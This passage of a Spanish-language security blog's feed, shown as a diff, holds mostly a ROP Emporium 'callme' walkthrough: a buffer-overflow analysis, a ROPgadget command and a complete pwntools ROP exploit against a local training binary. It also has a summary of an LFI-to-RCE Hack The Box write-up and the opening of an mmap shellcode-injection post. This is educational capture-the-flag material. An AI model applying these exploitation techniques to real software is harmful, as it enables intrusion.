+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="LFI" /><category term="python format string" /><summary type="html">Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde aprovecharemos una configuracion incorrecta de un proxy mediante una expresion, que nos permitira modificar una propiedad mediante la interacción de un socket de redis para convertirnos en “Pro”, posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/htb-format/waifu.gif" /><media:content medium="image" url="/assets/img/htb-format/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Inyeccion de shellcodes usando la syscall mmap</title><link href="/blog/posts/2023-06-10-inyeccion-shellcodes-mmap/" rel="alternate" type="text/html" title="Inyeccion de shellcodes usando la syscall mmap" /><published>2023-06-10T00:00:00-06:00</published><updated>2023-06-10T21:32:40-06:00</updated><id>/blog/posts/inyeccion-shellcodes-mmap</id><content type="html" xml:base="/blog/posts/2023-06-10-inyeccion-shellcodes-mmap/">&lt;h2 id=&quot;mmap&quot;&gt;mmap&lt;/h2&gt;
 
 &lt;p&gt;mmap es una syscall y una funcion incorporada en el header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys/mman.h&lt;/code&gt; la cual permite asignar o mapear memoria dentro del espacio de direcciones virtuales de un proceso, mmap regresa un puntero void (void *), la estructura es:&lt;/p&gt;
 
@@ -2268,183 +2546,4 @@ bash-5.1#
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/GNUradio-IQ/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer, espero que te haya gustado este tema, por que seguire subiendo cosillas interesantes que se pueden hacer con GNU radio ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="GNU radio" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/GNUradio-IQ/waifu.gif" /><media:content medium="image" url="/assets/img/GNUradio-IQ/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">ROP emporium callme - Llamando multiples funciones</title><link href="/blog/posts/2023-04-24-rop-emporium-callme/" rel="alternate" type="text/html" title="ROP emporium callme - Llamando multiples funciones" /><published>2023-04-24T00:00:00-06:00</published><updated>2023-05-31T19:37:58-06:00</updated><id>/blog/posts/rop-emporium-callme</id><content type="html" xml:base="/blog/posts/2023-04-24-rop-emporium-callme/">&lt;h2 id=&quot;analisis&quot;&gt;Analisis&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/callme/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;No tiene canary, PIE, pero tiene NX, asi que no podemos ejecutar codigo en el stack.&lt;/p&gt;
-
-&lt;p&gt;Al ver la funcion main, lo unico interesante es el llamado a la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwnme&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/callme/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez en esa funcion, podemos ver la vulnerabilidad:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/callme/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que esta intentando escribir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x200&lt;/code&gt; bytes (512 en decimal) de la entrada estandar (stdin), dado un buffer, pero… Te voy a demostrar por que es vulnerable.&lt;/p&gt;
-
-&lt;p&gt;Cuando se hace el llamado a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read()&lt;/code&gt;, se hace con esta estructura:&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;El primer argumento &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt;, se le conoce como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file decriptor&lt;/code&gt;, que en palabras simples, se usa para crear una entrada para un archivo, esa entrada se identifica con un numero unico&lt;/p&gt;
-
-&lt;p&gt;El segundo argumento es un puntero a un buffer, y este buffer se esta creando aca:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/callme/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos ver que se esta inicializando un buffer de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20&lt;/code&gt; bytes (32 en decimal) con el nombre de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;El tercer argumento es la cantidad de bytes que va a escribir en ese buffer, que son &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x200&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Entonces representando la funcion con los valores, quedaria asi:&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Esta tratando de escribir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;512&lt;/code&gt; bytes en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32&lt;/code&gt;, y como no se esta limitando la cantidad de bytes ingresados, ese buffer de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32&lt;/code&gt; bytes va a petar, es la clasica vulnerabilidad buffer overflow, por que se esta sobrepasando la cantidad del buffer, que son 32.&lt;/p&gt;
-
-&lt;p&gt;Al mostrar todas las funciones en radare, tenemos que existe una funcion que se llama &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;usefulFunction&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/callme/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al mostrar el codigo de la funcion:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/callme/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos damos cuenta que esta llamando a las funciones &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_three&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_two&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_one&lt;/code&gt;, y se estan llamando con los argumentos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Como curiosidad, si intentamos mostrar el codigo de una funcion de esas, no vamos a poder, sale algo como esto:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/callme/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y eso es por que las funciones &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_three&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_two&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_one&lt;/code&gt; se encuetran en PLT que se esta cargando dinamicamente de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libcallme.so&lt;/code&gt;, entonces para poder verlas, tenemos que ejecutar el binario, me ire a gdb y pondre un breakpoint en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; de la funcion main:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0000000000400897 &amp;lt;+80&amp;gt;:	ret
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ahora si ya podemos ver su codigo, y lo mas relevante es que cuando se hace un llamado a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_one&lt;/code&gt;, los argumentos que se le pasan los compara con:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;0xdeadbeefdeadbeef&lt;/li&gt;
-  &lt;li&gt;0xcafebabecafebabe&lt;/li&gt;
-  &lt;li&gt;0xd00df00dd00df00d&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/callme/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;(en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_three&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_two&lt;/code&gt; es lo mismo)&lt;/p&gt;
-
-&lt;p&gt;Asi que ahora sabemos que debemos de llamar a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_three&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_two&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callme_one&lt;/code&gt; con los valores con los que se comparan los registros &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;crafteando-el-exploit&quot;&gt;Crafteando el exploit&lt;/h2&gt;
-
-&lt;p&gt;Para saber el desplazamiento para llegar al RIP, podemos generar una cadena con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern create 100&lt;/code&gt; y pasaresela al programa, despues podemos hacer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern offset $rbp&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/callme/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y al sumarle 8 bytes, y nos da 40&lt;/p&gt;
-
-&lt;p&gt;Asi va esta ahora:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./callme&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;argumento_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;argumento_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xcafebabecafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;argumento_3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xd00df00dd00df00d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como tenemos que escribir en rdi, rsi y rdx, debemos que buscar un gadget que nos permita hacer eso, usare ROPgadget con el comando:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ROPgadget --binary callme | grep 'pop rdi ; pop rsi ; pop rdx ; ret'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y este nos funciona: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Asi va el exploit:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./callme&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;argumento_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;argumento_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xcafebabecafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;argumento_3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xd00df00dd00df00d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x000000000040093c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Despues ocupamos las direcciones de callme_one y las demas, eso lo podemos hacer con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;afl&lt;/code&gt; en radare:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./callme&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;argumento_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;argumento_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xcafebabecafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;argumento_3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xd00df00dd00df00d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x000000000040093c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;callme_one&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00400720&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;callme_two&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00400740&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;callme_three&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x004006f0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y por ultimo tenemos que mandar el payload en el orden correcto, primero el padding, luego el gadget, los valores de los argumentos y la funcion, asi queda el exploit completo&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./callme&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;argumento_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;argumento_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xcafebabecafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;argumento_3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xd00df00dd00df00d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x000000000040093c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;callme_one&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00400720&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;callme_two&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00400740&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;callme_three&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x004006f0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argumento_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argumento_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argumento_3&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;callme_one&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;callme_two&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;callme_three&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
